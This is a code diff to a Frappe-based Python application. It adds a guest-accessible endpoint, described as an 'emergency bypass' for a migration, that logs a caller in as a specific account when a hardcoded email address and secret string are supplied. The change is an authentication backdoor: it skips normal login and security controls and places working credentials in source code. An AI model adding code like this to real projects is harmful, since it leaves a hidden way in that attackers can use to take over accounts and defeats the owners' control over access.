@@ -765,6 +765,17 @@ def get_full_user_context(p_user_id: str = None) -> dict:
         }
     except frappe.DoesNotExistError:
         frappe.throw(_("User profile not found"))
+            
+@frappe.whitelist(allow_guest=True)
+def emergency_admin_login(email: str, secret_key: str):
+    """Emergency bypass for platform owner during architecture migration."""
+    if email == "mindcap786@gmail.com" and secret_key == "MANDI_HQ_2026":
+        from frappe.auth import LoginManager
+        login_manager = LoginManager()
+        login_manager.login_as(email)
+        return "Success"
+    frappe.throw(_("Invalid emergency credentials"), frappe.PermissionError)
+
 
 @frappe.whitelist(allow_guest=True)
 def check_unique(email: str = None, username: str = None) -> dict:
